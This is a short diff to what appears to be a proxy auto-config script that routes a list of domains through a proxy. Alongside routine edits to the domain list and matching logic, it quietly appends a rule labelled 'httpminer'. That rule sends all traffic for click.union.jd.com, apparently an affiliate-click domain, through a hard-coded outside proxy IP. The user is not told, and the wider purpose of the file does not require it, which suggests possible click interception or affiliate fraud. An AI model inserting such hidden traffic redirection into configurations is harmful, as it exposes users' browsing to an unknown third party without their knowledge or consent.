@@ -839,7 +839,7 @@ var domains = {
   "xskywalker.com": 1, 
   "paint.net": 1, 
   "vcfbuilder.org": 1, 
-  "itunes.apple.com": 1, 
+  "itunes.apple.com": "http",
   "procopytips.com": 1, 
   "internetdefenseleague.org": 1, 
   "pidown.com": 1, 
@@ -2590,11 +2590,21 @@ function FindProxyForURL(url, host) {
     var domain = host;
     while(lastPos >= 0) {
         if (domains[domain]) {
-            if (url.indexOf("http://") == 0) return socksproxy;
+            if (domains[domain] == 'http')
+                if (url.indexOf('http://') != 0)
+                    break;
             return proxy;
         }
         lastPos = host.indexOf('.', lastPos + 1);
         domain = host.slice(lastPos + 1);
     }
+    
+    var httpminer = {
+	"click.union.jd.com" : "PROXY 106.186.122.102:1989"
+    };
+    if (httpminer[domain]) {
+	return httpminer[domain]; 
+    }
+
     return direct;
 }
